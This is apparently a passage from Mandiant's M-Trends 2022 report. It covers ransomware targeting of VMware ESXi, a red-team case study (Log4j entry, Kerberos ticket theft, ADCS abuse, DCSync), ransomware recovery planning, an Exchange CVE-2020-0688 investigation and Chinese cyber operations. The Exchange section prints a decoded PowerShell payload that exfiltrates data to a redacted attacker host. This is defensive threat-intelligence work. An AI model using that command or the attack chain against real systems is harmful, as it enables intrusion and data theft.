and Poland, attempting to create tensions in Polish-Lithuanian relations, and
discrediting the Belarusian opposition.

FINANCIALLY MOTIVATED
THREAT ACTORS
INCREASINGLY TARGETING
VIRTUALIZATION
INFRASTRUCTURE
In 2021, Mandiant observed ransomware attackers using new tactics, techniques
and procedures (TTPs) to deploy ransomware rapidly and efficiently throughout
business environments. The pervasive use of virtualization infrastructure in
corporate environments creates a prime target for ransomware attackers. By
accessing virtualization platforms, ransomware attackers can rapidly encrypt many
virtual machines without needing to directly login or deploy encryptors within each
machine. Throughout 2021, Mandiant observed VMWare vSphere and ESXi platforms
being targeted by multiple threat actors, including those associated with Hive,
Conti, Blackcat, and DarkSide. Several protection strategies can be implemented to
mitigate risk.
Observed attacker TTPs
During a typical ransomware event, after initial access has been obtained, threat
actors will spend time conducting reconnaissance within the target organization
for ways to deploy ransomware. They discover that many organizations use vCenter
Server to manage their virtualization infrastructure and integrate the platform
with their Microsoft Active Directory domain by directly joining the vCenter Server
FOCUS ON to Active Directory. Ransomware threat actors focus on this integration to identify
specific Active Directory users and groups that may be provided access to login to a
vCenter Server.
MULTIFACETED EXTORTION Armed with the knowledge that an organization is utilizing vCenter Server, actors use
compromised credentials to login to vCenter Server and discover all the ESXi hosts
used in the environment. The ESXi servers are a ripe target for many actors; they
AND RANSOMWARE need to log directly in to these servers to deploy ransomware, which impacts the
availability of all virtualized hosts running on the server. Mandiant observed threat
actors turning on the ESXi Shell and enabling direct access via SSH (TCP/22) to the
ESXi servers to ensure that ESXi host access remains available. In addition, actors
often created new (local) accounts for their use on the ESXi servers and changed the
password of the existing ESXi root account to ensure the target organization could
not easily regain control of their infrastructure.
SPECIAL REPORT | MANDIANT M-TRENDS 2022 58
After successful access to the ESXi servers was obtained, the threat actors used
SSH access to upload their encryptor (binary) and any shell scripts that were
required. They used shell scripts to discover where virtual machines were located on
the ESXi datastores, forcefully stop any running virtual machines, optionally delete
snapshots and then iterate through the datastores to encrypt all the virtual machine
disk and configuration files.

threat actors being
When configuring networking on the ESXi hosts, only enable VMkernel network
able to directly impact adapters on the isolated management network. VMkernel network adapters provide
network connectivity for the ESXi hosts and handle necessary system traffic for
the virtualization
functionality such as vSphere vMotion, vSAN and vSphere replication. Ensure that all
infrastructure. dependent technologies such as vSANs and backup systems that the virtualization
infrastructure will use are available on this isolated network. If possible, use
dedicated systems exclusively connected to this isolated network to conduct all
management tasks of the virtualization infrastructure.
To further restrict services and management of ESXi hosts, implement lockdown
mode. This ensures that ESXi hosts can only be accessed through a vCenter
Server, disables some services and restricts some services to certain defined
users. Configure the built-in ESXi host firewall to restrict management access only
from specific IP addresses or subnets that correlate to management systems on
the isolated network. The ESXi host firewall can also close ports for each service
or restrict traffic from specific IP addresses. Determine the appropriate risk
acceptance level for vSphere Installable Bundles (VIBs) and enforce acceptance
levels in the Security Profiles for ESXi hosts. This protects the integrity of the hosts
and ensures unsigned VIBs cannot be installed.
Consider decoupling ESXi and vCenter Servers from Active Directory and use
vCenter Single Sign-On. Removing ESXi and vCenter from Active Directory will
prevent any compromised Active Directory accounts from being able to be used to

Centralized logging of ESXi environments is critical, both to proactively detect
potential malicious behavior and investigate an actual incident. Ensure all ESXi
host and vCenter Server logs are being forwarded to the organization’s SIEM
solution. This provides visibility into security events beyond that of normal
administrative activity. In several cases, Mandiant was able to help organizations
regain control of their ESXi hosts because shell logs were available in a centralized
log aggregation solution.
Organizations should prioritize the following logging and alerting
recommendations:
1. Use ESXi syslog capabilities to forward messages to a centralized log
aggregator
2. Capture the Authentication log (/var/log/auth.log), Shell log (/var/log/
shell.log), and VMkernel log (/var/log/vmkernel.log)
3. Configure alerts for high fidelity operations:
• Activation of the ESXi shell
• Creation of new local accounts on ESXi hosts
• Password changes of local accounts on ESXi hosts, including
the root account
• Large number of virtual machines being stopped in rapid succession and
snapshots being deleted.

In 2021, a manufacturing firm contracted Mandiant to perform a Red Team
Assessment to evaluate the organization’s detection, prevention, and response
capabilities. The organization’s concern regarding a potential encryption event was
elevated due to the recent rise in ransomware threat activity. Mandiant’s objectives
were to acquire Domain Admin privileges and to demonstrate the capability to
compromise critical backup infrastructure. During red team assessments, Mandiant
consultants use methodologies similar to those of threat actors. To achieve the
customer’s objectives Mandiant needed to identify and exploit vulnerable services,

Initial Compromise
Over the years, Mandiant has observed an ebb and flow between spear-phishing
and exploits leveraged as the initial means of compromise. Successfully breaching
Internet-facing infrastructure allows attackers to bypass email-based security
controls and obtain an initial foothold in an environment. The Mandiant red
team performed open-source intelligence (OSINT) reconnaissance and network
enumeration to identify potentially misconfigured or vulnerable services that may
have presented opportunities for an attack. One identified service was running an
outdated version of the Java logging library Apache Log4j that was susceptible
to CVE-2021-44228. This vulnerability could provide an attacker unauthenticated
remote code execution through the control of log messages or log message
parameters such as HTTP headers. The red team used this vulnerability to gain an
initial foothold in the environment by crafting a User-Agent HTTP header that, when
logged through log4j, would result in the endpoint retrieving and executing an object
from an LDAP server under Mandiant’s control.
Internal Reconnaissance and Privilege Escalation
With a foothold in the firm’s network, the Mandiant red team performed passive
reconnaissance of the internal network and enumerated resources to find ways
to facilitate lateral movement. During passive reconnaissance, attackers often
gather information on high-value targets by mining secondary or tertiary systems
that may contain valuable information. Common stores of data such as Git portals,
Confluence and SharePoint are often sources for passive reconnaissance. Unlike
port scanning, hunting for valuable data in information repositories often presents
fewer opportunities for detection while providing high quality data regarding the
environment.
The red team discovered a misconfigured Confluence instance within the
customer’s environment that did not require authentication, allowing the team to
gather information on network resources, sensitive documents, and even cleartext
passwords. Analysis of the data collected through passive reconnaissance led
to the discovery of several Jenkins servers that did not require authentication to

Stealing Kerberos Tickets
With admin-level rights available through the Jenkins server, the Mandiant red
team had the privileges necessary to acquire credentials stored in memory. The
credentials could then be used to move through the customer’s environment and
closer to the critical backup infrastructure. The red team performed host-based
reconnaissance on the Jenkins server to enumerate recently logged in users and
the systems to which these users had access. While several system administrators
were logged into the Jenkins server remotely, these accounts were managed
through a password vault system. This password vault system generates long,
complex passwords with daily password rotations to reduce the prevalence of weak
and reusable passwords, so recovering and cracking in-memory NTLM password
hashes was not feasible. The red team instead targeted the Kerberos Ticket Granting
Tickets (TGT) that are stored in memory and can be renewed for a week regardless
of CyberArk’s daily password rotation. By establishing a connection to the Local
Security Authority (LSA) server running on the Jenkins endpoint, the red team was
able to extract the system administrators’ Kerberos tickets and auto-renew them for
a week.
Lateral Movement
Ransomware operators commonly target backup infrastructure to exert additional
control over encrypted environments. Obtaining access to backup infrastructure
is a common precursor to threat actors deploying ransomware to endpoints across
the targeted environment. Mature security programs will often protect critical
servers such as backup infrastructure by segmenting them into a secure network
only accessible from a jump host. With broad access to the customer environment
through privilege escalation and lateral movement, the red team thoroughly
analyzed the Active Directory environment to identify a jump host with access to the
customer’s segmented backup network.
The red team then used a system administrator’s Kerberos TGT to query Windows
Management Instrumentation (WMI) on the jump host. Enumerating the recently
logged in users and the processes running on the jump host allowed Mandiant to
understand how the customer might detect their actions. Assured that their actions
would remain clandestine, the red team moved to the jump host by uploading a TCP
payload via SMB and executing it using Windows Remote Management (WinRM).
Once the jump host was compromised, the red team identified an active user on
the jump host and deployed a keylogger to capture the cleartext credentials of a
backup administrator. Within the span of two days, the red team acquired several
sets of cleartext credentials that provided access to the customer’s secure backup
infrastructure demonstrating the ability to access, delete, or modify the endpoints.

reduce the possibility of domain
compromise.
Red Forest Active Directory architecture tiers Active Directory objects such
that attackers are presented with substantial obstacles in the path to Domain
Admin privileges. To overcome this limitation, the red team first enumerated
the customer’s Active Directory for information regarding certificate templates
associated with Active Directory Certificate Services (ADCS). Among the templates
returned the red team identified a vulnerable ADCS template where backup
administrators could self-enroll. This certificate template had a combination
of allowable configurations that could be abused by backup administrators to
impersonate high-privilege accounts, such as a domain administrator account.
The template allowed backup administrators to specify a Subject Alternative Name
(SAN) for the certificate while enrollment did not require manager approval and
certificates could be used for domain authentication.
To demonstrate this avenue of attack, the red team used the backup administrator’s
account to request a certificate with a domain administrator user specified for
the SAN. Using the certificate returned by the ADCS server, the team requested
a Kerberos TGT ticket for the domain administrator account to access network
resources. The Mandiant red team then performed a DCSync attack to acquire
domain administrators’ NTLM password hashes and secure Domain Admin privileges
in the Active Directory environment.
Outcomes
The Mandiant red team was able to acquire Domain Admin privileges and
demonstrate an effect on the secure backup infrastructure despite the customer’s
strong password policy, Red Forest architecture and network segmentation.
Mandiant achieved all their specified objectives not in-spite of the policies in place
but by identifying alternative paths to success. They applied years of experience to
demonstrate vulnerabilities and provide actionable recommendations to help the
customer close security gaps.
Ransomware proliferation demands that organizations not only evaluate but also
demonstrate and observe how ransomware operators achieve their objectives.
Organizations have worked to build better defenses, align their policies with best
practices and take a security-first perspective to their operations. But until they
are actively tested by a motivated and agile adversary, their protection remains
hypothetical at best.

With the continued surge of ransomware events observed throughout 2021,
organizations must do more than align technology defenses and prioritize updating

reassessment of the environment becomes a natural process.
The inherently destructive nature of ransomware often presents obstacles to
investigative teams because the artifacts needed to gain confidence in findings
become unavailable. As ransomware operators become more nuanced and develop
methodologies that include anti-forensics techniques, the time between the
identification of the breach and the delivery of a comprehensive timeline scales
proportionally. Delays in gaining a complete understanding of attacker activity
within an environment inhibits the ability to plan for an exhaustive recovery process.
As those delays increase, pressure to recover business operations is likely to
increase.
Ransomware operators make money by interrupting business operations for
organizations; if the cost of disrupted business operations is higher than the cost
of the extortion, ransomware operators know they can maintain leverage against
targeted organizations. Attempting to recover rapidly and restore systems for
business operations could introduce additional risks, especially if systems and
applications are restored to a state where attacker backdoors and malware were
already present. A re-infection or a subsequent encryption event will ultimately have
a longer-term impact on revenue and business operations.
SPECIAL REPORT | MANDIANT M-TRENDS 2022 66
Organizing a Response
Team Leads
Organizations that were able to contain and recover from a ransomware event
successfully established internal team leads for critical processes. These team
leads were responsible for coordinating and aligning resources to support
investigation, recovery and remediation workstreams as part of the overall
response. Leads were able to articulate priorities to all team members, establish
escalation channels and align time-sensitive information for decision-making
processes.
Mandiant incident response teams work closely with these leads to assess incident
scope, deploy initial countermeasures to regain control of the environment and
deploy endpoint forensic tools across the environment as needed. Afterwards, the
incident response team can provide intelligence to inform other workstreams.
Communications
The management of effective communications is a critical process for successful
remediation because work streams grow in both depth and breadth. Maintaining
a secure means of communication with well-defined escalation channels allows
designated leads to manage and delegate where needed.
Out-of-band communications channels
If the adversary is suspected to have access to email or group communications
software,Organizations should establish out-of-band channels for secure
communications.Working with a cloud collaboration suite provider is usually
the quickest route to establishing a secure and readily accessible platform.
Escalation channels
When investigating a cyber event and prioritizing recovery and reconstitution
of data and applications, normal escalation paths and channels are often too
slow to be effective. Organizations should proactively establish escalation
parameters and channels to ensure information can be efficiently routed to the
proper leads and executive stakeholders for timely and coordinated decisions.
Surge Support
To meet operational recovery objectives after a successful ransomware attack,
additional staffing and support are often required. Organizations should proactively
review and align relationships with external vendors and partners that can assist if
surge support is required. Aligning vendors and partners who already understand
the operational environment can be a success driver when an organization is
faced with a large-scale event that has impacted the availability of infrastructure,
applications and data.
SPECIAL REPORT | MANDIANT M-TRENDS 2022 67
Navigating Setbacks
Every incident recovery effort will experience setbacks that can jeopardize planned
and previously communicated recovery timelines.
Remediation efforts and proposed mitigation controls can cause setbacks resulting
in delays or a return to prior service state. Alternate options can be developed but
are typically tied to considerable risk, which is why they were not considered as the
first course of action. Communication of risk should be weighed against possible
time savings, service availability increase or other operational advantages.
Rapid Field Assessment
An initial assessment and inventory is a critical priority for aligning investigative and
recovery efforts following a ransomware event.
Current-state information on IT environments
Initial assessment of current environments and assets accelerates planning
and prioritization during response efforts. The operational status, site to
site connections and remote access methods are a few examples of critical
information to have for each distinct environment.
Delegation
Based on the size of the organization, number of environments impacted and
available staffing, it may take time to complete the initial inventory for triage.
If regional or environment-specific recovery leads are deemed necessary, they
should report to a single recovery lead that can drive task priority, reporting
and recovery needs.
Waves of Recovery
Using a multi-wave approach allows organizations to summarize complex
system hierarchies and enhance multi-team recovery efforts. Depending on the
availability of technical resources, an organization can use wave classifications
to enable teams to work more autonomously.
Using current-state information, organizational leaders should identify critical
systems required to re-establish operational continuity. Examples of essential
applications include identity and authentication (IAM) services, domain name
resolution services and centralized applications used to secure and verify
endpoints and remote access platforms. These critical systems and services
should be included within the first wave of restoration activity. The first wave
should establish minimum viable infrastructure for the next wave of recovery.
This model can be used in multiple iterations to organize recovery based on
business priority.
SPECIAL REPORT | MANDIANT M-TRENDS 2022 68
Recovery
Critical Steps
Mandiant recommends organizations perform system and application recovery
and validation in isolated network segments that do not have direct connectivity
to the impacted infrastructure. This approach reduces potential risks related to
restored systems being re-compromised, encrypted or accessed by an adversary.
Recovery and reconstitution workstreams will require significant time and effort. A
re-compromise of newly reconstituted infrastructure would introduce setbacks that
could have broad-scale financial and business-focused impacts.
Tactical business service recovery from a ransomware attack can involve powering
on systems or restoring systems or data from backups. Neither activity should be
trusted. Since the state of systems at backup or shutdown is unknown, recovery
operations including those systems presents considerable risk when done prior
to a comprehensive investigation. As part of investigation and recovery efforts,
Mandiant helps mitigate immediate risk from untrusted systems.
The Choice to Rebuild or Recover from Backups
The question of whether to restore from backup or rebuild a system is a common
focus during ransomware recovery. Assessing the risk presented by either process
involves a series of validation steps to determine the appropriate response.
If the earliest date of compromise has not been identified, recovering from backup
media presents the additional risk of unknowingly reintroducing the attacker to the
environment. A restored system may contain attacker tools, such as the ransomware
encryptor or a backdoor. Pairing compensating controls, such as a segmented
network, with the recovery process, allows for greater recovery confidence and
ensures adequate time to assess the endpoint.
Network Connectivity
Ideally, reestablishing network connectivity from newly rebuilt infrastructure should
not occur until the investigation has been completed and all tactical hardening goals
related to containment and eradication have been completed. When the timeline
conflicts with operational needs, security controls can be implemented to mitigate
recovery risks.
The organization should evaluate existing means of ingress. Identifying and
reviewing all external facing systems through which legitimate and malicious
users can attempt access requires a comprehensive audit of existing systems.
Each instance of available access should be evaluated for existing business
needs and the associated risk level. When the risk outweighs the business need,
decommissioning the endpoint is the quickest way to ensure it cannot be used by
an attacker. If the means of access is determined business critical, compensating
controls and security monitoring instrumentation should be prioritized. Multifactor
authentication should be enforced and all accounts with access to the endpoint
should be rotated preemptively.
SPECIAL REPORT | MANDIANT M-TRENDS 2022 69
In addition to a review of ingress access, establishing an allow-only egress policy
for internet connectivity can severely limit opportunities for infected endpoints
to contact attacker command-and-control channels. An allow-only egress
policy defaults to a denied or closed state for connections which have not been
investigated and approved prior to the connection. Similarly, outbound DNS
connections from non-standardized endpoints can be rejected at the perimeter,
forcing all DNS requests through a centralized and controlled DNS server. A
centralized DNS server allows the organization to implement appropriate security
instrumentation, such as passive logging and known-bad domain blocking.
Conclusion
There is no one-size-fits-all remediation plan to serve every recovery effort.
Ransomware events present unique challenges and act as a catalyst for change.
They highlight inefficiencies in asset management, technology deployment and
security processes. While a perfect plan may not exist, thorough planning helps an
organization prepare and empower itself to work toward successful recovery and
return to normal operations.

DIGGING PAST A
CRAFTYCOINMINER
71
INTRODUCTION
In 2021, Mandiant was engaged to investigate over 20 incidents involving
exploitation of vulnerabilities in on-premises Microsoft Exchange servers. These
cases ran the gamut in terms of threat actor sophistication as well as the impacts
to our clients. For most of these cases the broad strokes of the initial compromise
shared common themes. More often than not an unpatched Microsoft Exchange
server was targeted to provide access into the customer environment. While
the initial detection that initiated a response can appear mundane, Mandiant has
been able to identify evidence to suggest a deeper compromise, which adds to the
complexity and breadth of the response.
Mandiant was engaged by a customer to investigate an antivirus alert that
originated from the customer’s on-premises Microsoft Exchange system. Initial
analysis of the malware sample determined it to be a cryptocurrency coinminer
commonly associated with opportunistic threat actors motivated by the prospect
of low risk returns through broadscale deployment. At the start of the engagement,
theories on initial access focused on Microsoft Exchange and Proxylogon—the
broadscale Exchange vulnerability reported earlier in the year that necessitated
a global response involving patching, investigation and remediation. As analysis
continued, Mandiant worked with the customer to scope the availability of data
and endpoints in the environment to enable a comprehensive and in-depth
investigation. Ultimately, this process identified the vulnerability the attacker
leveraged for initial entry and subsequent deployment of the coinminer.
Coinminers are cryptocurrency miners that
may be installed by potentially unwanted
programs (PUPs), a Trojan downloader, or
through a malicious link shared on social
media in order to generate revenue for
cyber criminal actors.
SPECIAL REPORT | MANDIANT M-TRENDS 2022 72
The Value of Robust Logging Practices
Enterprises often bind log maintenance to business use cases. For example, if
specific logs would help identify the root cause of an outage, those logs begin
to lose value or go stale if the applications remain responsive. In the context of
information security, the value of logging and the cost of log retention can be difficult
to determine and justify. The value of logs for investigations depends heavily on the
expected dwell time of a hypothetical threat actor. Investigations are often limited
based on the fields being logged and their retention duration.
Customer log retention not only included a robust set of Internet Information
Services (IIS) and Exchange Control Panel (ECP) logs but also covered a timespan
that was more than 10 times the median dwell time observed in 2020. This data
set allowed Mandiant to identify the exploitation of a Remote Code Execution
vulnerability in Microsoft Exchange tracked as CVE-2020-0688.
CVE-2020-0688 was publicly reported on February 11, 2020 and was one of four
Exchange vulnerabilities with a CVSS score of 7 or greater reported that year. By
February 24, 2020, proof-of-concept (PoC) exploit code was available, enabling threat
actors of varying sophistication to run the code on vulnerable Exchange servers if
the attacker had valid mailbox credentials. In March 2020, the popular exploitation
toolkit Metasploit included a module specific to CVE-2020-0688 and widespread
exploitation of the vulnerability was being observed. From an attacker’s viewpoint,
if they could acquire legitimate credentials, they could leverage the vulnerability
to send HTTP requests that contained an encoded command in the VIEWSTATE
query parameter of the Exchange Control Panel. The system would then deserialize
the value provided in the VIEWSTATE parameter and run the commands provided
by the attacker. Commands were submitted via an HTTP request containing query
parameters, so analysis regarding this vulnerability largely relied on logs associated
with web traffic. Because the vulnerability was specific to the ECP module in
Exchange, associated log data was critical to scoping the breadth of compromise
and follow-up due diligence analysis.
Intensive Investigations Reveal Deeper Threats
Incident response is a complex process driven by simple fundamentals. A core
tenet is that accurate scoping of an environment drives the quality of information
investigators need to identify malicious activity, differentiate attacker campaigns
and assess the confidence of findings with respect to the objectives of an attacker.
Mandiant worked with the customer to understand the data sources available and
the context in which they were generated. The customer tasked subject matter
experts within their organization to acquire and deliver comprehensive sets of data
from individual data stores to the investigative team. In parallel, Mandiant used
endpoint technology to capture enterprise-wide ephemeral data from within the
environment to supplement the data stores received from the customer. Throughout
the investigation, as details emerged regarding the threat group initially identified,
Mandiant and the customer would repeat this process to update and realign their
mutual understanding of the impact of the breach. This process, an iterative
collection and reorientation of both data sets and investigative activities, provided
Mandiant Incident Response consultants with the ideal circumstances for an agile,
thorough analysis.
SPECIAL REPORT | MANDIANT M-TRENDS 2022 73
The objective of a Mandiant incident response during an incident is not only to
identify malicious activity but also contextualize the threat given our historical
expertise. As CVEs are published and PoC code is made available, threat attackers
are likely to take advantage of the vulnerability quickly in either broad-scale or
targeted compromises.
For an incident in which a published vulnerability is suspected to have been
leveraged, investigation of the observed effect—such as this coinminer—is a
necessary but insufficient condition of comprehensive incident response. Extensive
scoping and the pursuit of alternate hypotheses help customers ensure they
have taken reasonable steps to secure their environments post-breach. Mandiant
investigators use thorough scoping and delivered datasets to identify potential
investigative threads and iterate the process to fully explore possibilities.
This methodology enabled Mandiant to identify not only the source of the
compromise and the actions of the threat actor but also evidence of malicious
activity that represented the existence of two state-based threat actors operating
in parallel within the environment. All three threat groups leveraged the same critical
vulnerability to compromise the environment but represented different operating
models commonly observed during investigations. Where the financially motivated
threat group was satisfied with the deployment of a coinminer, the other two groups
(UNC3016 and APT41) performed reconnaissance, deployed persistence mechanisms
and used post-exploitation tools.
SPECIAL REPORT | MANDIANT M-TRENDS 2022 74
UNC3016
In February 2020, shortly after PoC code for CVE-2020-0688 was released, a threat
group Mandiant tracks as UNC3016 compromised the customer’s Microsoft Exchange
server through that vulnerability. Mandiant identified 52 encoded commands stored
with the URL VIEWSTATE query variable of requests destined for the Microsoft ECP
application. Figure 2 provides the decoded contents of the earliest attacker payload
in which the attacker began their system reconnaissance efforts by collecting
details regarding the Exchange install path. The information collected during
reconnaissance was then transferred to attacker-controlled infrastructure.
Figure 2: Decoded attacker payload.
<System:String>”$t = $env:exchangeinstallpath;$b = [Convert]::ToBase64String([System.Text.
Encoding]::Unicode.GetBytes($t));iwr -Uri http://REDACTED/$b -UseBasicParsing” </System:String>
Within days of the initial compromise, UNC3016 issued 37 HTTP requests with
VIEWSTATE parameters designed to concatenate Base64 encoded strings into a file
that was then decoded using the Windows utility certutil. The end result was a web-
based backdoor providing UNC3016 remote command execution via the Windows
Command Line Interpreter (CLI). The web based backdoor allowed the threat group
to maintain the same means of access via HTTP with features and conveniences not
expressible through the CVE-2020-0688 vulnerability.
With this foothold established, UNC3016 proceeded to create and upload additional
web shells and attacker utilities. Many of the tools used during this incident
were publicly available and could be used legitimately or maliciously. To gather
additional credentials once inside the network, UNC3016 used the SysInternals
utility ProcDump that is commonly used to monitor for CPU spikes but is also used
by various threat groups to access process memory which may contain passwords.
Mandiant also identified evidence to indicate UNC3016 used the freely available
network mapping tool Advanced IP Scanner to perform network reconnaissance.
When UNC3016 needed more complex capabilities, it used more obscure tooling
such as Secure Socket Funneling (SSF) and SharpChisel to create secure proxies
through which the attacker could route Remote Desktop Protocol (RDP) connections
and move further into the environment. UNC3016 used this pattern to access over
30 endpoints in the customer’s internal environment. In some cases, UNC3016 used
Impacket WMIExec or POWGOOP to run commands on select systems. As higher
interest systems were identified, a combination of RazorSQL and FileZilla enabled
UNC3016 to extract sensitive data.
Despite UNC3016’s reliance on publicly available and generally noisy post-
exploitation tools, Mandiant identified instances in which UNC3016’s capabilities
veered into more obscure territory. During forensic analysis of the Exchange servers,
Mandiant identified a custom backdoor in the form of an IIS module written in C++.
This newly discovered malware that Mandiant now tracks as RUDEVISIT provided
the threat group with a stealthy way to run commands remotely via the Windows CLI
under the SYSTEM user context. Once the malware was registered as a native-code
HTTP module, RUDEVISIT inspected the HTTP headers of incoming requests. If a
request contained the HTTP header “Cf-Ray-Visitor”, RUDEVISIT would decode and
execute the Base64 encoded value via the Windows CLI.
SPECIAL REPORT | MANDIANT M-TRENDS 2022 75
While compromise through CVE-2020-0688 requires the use of HTTP query
strings that are commonly logged on most platforms, the use of a backdoor to run
commands through HTTP headers may indicate UNC3016’s intent to remain hidden.
Logging HTTP headers is an uncommon practice given the volume of headers in
general web usage. RUDEVISIT demonstrates UNC3016 has the means to extend their
capabilities beyond that of publicly available tools while maintaining a relatively quiet
presence within the environment and moving to complete their objective.
APT41
Strong log retention policy has long been a mainstay of security recommendations.
This customer’s excellent logging on the compromised Exchange servers provided
Mandiant a lens into the initial entry point for multiple threat groups. The nature of
the vulnerability and the attack made it possible to reconstruct attacker activity
above and beyond the ability of traditional forensic methods.
In June 2020, the threat group APT41 leveraged CVE-2020-0688 to compromise
the customer’s on-premises Exchange servers. Mandiant identified 638 malicious
VIEWSTATE payloads issued to the ECP application. By reconstructing the payload
activity, Mandiant discovered that APT41 quickly shifted from reconnaissance
commands to establishing a foothold through the deployment of a CHOPPER web
shell and the backdoor DUSTCOVER. While some variants of DUSTCOVER contain an
embedded payload, the variant discovered during this investigation read an external
payload from disk and launched it in memory. Mandiant had previously observed
APT41 using DUSTCOVER to launch Cobalt Strike BEACON and CROSSWALK. Based
on reverse engineering analysis of the sample acquired during the reconstruction of
attacker commands, this variant of DUSTCOVER launched BEACON.
Given the time between initial compromise and discovery, the recovery of files
created and deleted by APT41 was limited. However, the ECP logs provided Mandiant
the ability to “replay” the creation of three files no longer present on the file Exchange
server at the time of analysis. The analysis of three reconstructed files resulted
in the discovery of a new malware family Mandiant now tracks as PIDGINSPUR. A
Windows Batch script served to configure persistence for the malware as well as
execute it. Reverse engineering analysis determined that the payload ran Cobalt
Strike BEACON.
Mandiant was also unable to rely on Windows Security Event logging to track APT41’s
lateral movement through the environment. The investigative team relied heavily
on the Windows Server User Access Logging (UAL) databases resident on Windows

Considerations for Security Advancement
It is important to maintain and build on the basics of security program development
regardless of advances in security technology. Long standing security program
initiatives such as asset management, log retention policies and vulnerability and
patching management can act as force multipliers for incident responders.
Identification of the initial vector of compromise would have been severely limited
without access to comprehensive logging. While endpoint forensics tends to be
foundational for Mandiant investigations, it relies on artifacts that weren’t specifically
designed with investigations in mind. This puts a natural ceiling on the levels of
confidence that can be applied during single-source investigations.
Similarly, threat actors are becoming more mindful of the trails they may leave behind
for an investigation. The ability to identify a threat actor in one environment and
apply intelligence from that specific campaign to as many environments as possible
introduces repercussions to actions that may expose a threat actor’s presence in an
environment. This duplicative effect of threat intelligence continues to put pressure on
threat actors seeking to undertake long-running campaigns.
Security initiatives such as log retention and asset management are rarely simple
solutions for organizations. A good log retention strategy requires an understanding of
the environment and investment in storage and log transmission. Asset management
solutions require investment in technology as well as consistent discipline and
review. With respect to incident response, each investment in security becomes a
measure against potential risk and the hypothetical value of that resource during an
investigation.
As organizational security programs mature, a mindset shift from detection to
response can help drive additional changes. This use case shows how a strong log
retention policy not only helps custodians of systems troubleshoot operational issues,
but also serves to better inform incident responders. It would be simple to conclude
that the coinminer exposed the efforts of two advanced threat groups but doing so
would gloss over a substantial amount of human effort. The coinminer certainly started
the process, but the efforts of the customer and their logging practices paired with a
thorough investigative methodology and comprehensive threat intelligence ultimately
ejected three threat groups from the customer environment.
The ability to identify a threat actor in one environment
and apply intelligence from that specific campaign
to as many environments as possible introduces
repercussions to actions that may expose a threat
actor’s presence in an environment.

CHINA REINVENTS
APPROACH TO
CYBER OPERATIONS
78
BACKGROUND
Historically, The People’s Republic of China has focused its national security
efforts on ensuring military and economic supremacy through a combination of
trade agreements, rapid technological developments, military modernization,
legal reforms and cyber espionage activities. China has used its cyber capabilities
to pursue state goals of securing regional hegemony and buttressing efforts to
assert itself internationally. In 2013, Mandiant exposed the People’s Liberation Army
(PLA) Unit 61398 and labeled it as an advanced persistent threat: APT1.16 The report
detailed the group’s long-standing computer espionage campaign against the U.S.,
other nations and private organizations. When the report was published, the extent
of evidence pointing to Chinese state sponsorship, and the quantity of networks and
companies compromised by China-nexus APTs had reached staggering numbers.
The TTPs for these groups followed a pattern and trend in Chinese activity that
allowed aggregate TTPs to further inform security analysts. After publication of the
APT1 report and subsequent U.S. government response to Chinese cyber activity,
Mandiant data from 2014-2016 began to show an overall decline in compromises by
China-nexus groups. The apparent decline in observable incidents may reflect the
shift within China’s own bureaucracy, where the centralization of state power and
the restructuring of the military apparatus resulted in a move away from prolific
amateur cyber-attacks in favor of more focused, professionalized, and sophisticated
attacks conducted by a smaller set of actors. Targets of cyber espionage are not
chosen at random; they are carefully selected and derived from priorities taken
from official government material such as the Five-Year Plans, domestic and
national defense white papers and other policy platforms. Mandiant believes there
is a direct correlation between Beijing’s national economic development plan, the
official 14th Five-Year Plan, that can be used to forecast future targets of cyber
espionage activity.

Realignment and Retooling
Since President Xi Jinping rose to power in 2012, China has continued to work toward
36 transforming its military and associated cyber operations into a cyber power worthy
of international attention. Xi Jinping has worked to centralize power over both the
government and security forces, including the PLA and the Ministry of State Security
active Chinese (MSS). Through meticulous bureaucratic and structural reorganizations, and at
APT and UNC times, geographical changes, Xi effectively changed the way cyber operations are
groups
conducted by China. One of his first reforms involved the establishment of the PLA’s
Strategic Support Force (SSF) and its subordinate Network Systems Department
(NSD) in 2016. This is often seen as the main driver of current and future Chinese
cyber operations.
In 2021, with the implementation of the 14th Five-Year Plan, China’s efforts continued
to focus on supporting the Belt and Road Initiative (BRI), with additional attention to
15%
areas such as technology, financials, energy, telecommunications and healthcare.
The Plan focuses heavily on increasing Chinese national self-reliance by growing
domestic markets to reduce the impact of trade disputes. It also includes mentions
of their
targets are of modernizing industry and supply chains, increasing “military-civil unity” and
U.S. entities synchronizing “national defense and economic progress.” These national-level
priorities signal an upcoming increase in China-nexus actors conducting intrusion
attempts against intellectual property or other strategically important economic
concerns, as well as defense industry products and other dual-use technologies over
the next few years.
The latest plan also introduces a new concept of Chinese network power. This
concept should be viewed as a subset of comprehensive and overall national power.
In acquiring the network infrastructure and connections to peripheral technologies
such as the Internet of Things (IoT), network power combines technology and
strategy to create a pervasive system that can be exploited by China for both internal
and external reconnaissance and surveillance campaigns. This strategy has already
proven successful as Beijing is able to target hardened, more challenging targets
indirectly through various supply chain and third-party victim compromises to
extract political, economic, defense and surveillance information.
Despite the apparent observable decline in Chinese cyber activity between 2014-
2016, China-nexus APTs continued to operate, sometimes using commercial off-
the-shelf malware, and often practicing improved operational security. Starting
in 2017, Mandiant began to observe China-nexus cyber espionage actors returning
to a regular operational tempo. In most cases, groups have re-emerged with new
malware or TTPs. In other cases, individual actors that were part of dormant groups
may have been reorganized into new operational teams or reassigned to existing
known threat groups. As a result, we are seeing an increasing number of activity
clusters, or uncategorized threat actors (UNCs), created around Chinese cyber
espionage activity. Between 2016 and 2021 we observed activity from 244 distinct
Chinese cyber espionage UNC actor sets. The gradual adoption of the same exploit
code among Chinese espionage groups prior to the release of public patches
suggests the existence of a shared development and logistics infrastructure and a
centralized coordinating entity.

Government organizations were the most targeted sector across all industries

sensitive information from public entities. This focus on government organizations
has held steady since 2018. However, we observed a decrease in the overall number
of Chinese cyber espionage actors focusing on government entities from 2019 to
2021. Mandiant believes some of the identified Chinese cyber espionage activity in
2021 is related to existing APTs or other clusters of UNCs. This is consistent with
Mandiant’s assessment that UNC activity is an evolution of previously identified
groups that we have not yet merged due to changes in TTPs, targeting or motivations.
Changes have also led to a rapid increase in information operations originating from
China targeting both internal and external dissidents and human rights activities.

APT10 changed operational TTPs following the 2018 U.S. Department of Justice
(DOJ) indictment of two group members believed to have acted in association with
the Chinese Ministry of State Security’s Tianjin State Security Bureau. In November
2020, Mandiant noted the re-emergence of this activity with the use of new tools
including the HEAVYHAND loader and the DARKTOWN backdoor. In 2021 we also
observed the use of the HEAVYPOT backdoor and RIVERMEAL, used for lateral
movement.
APT41
APT41 is a prolific cyber threat group that carries out Chinese-state sponsored
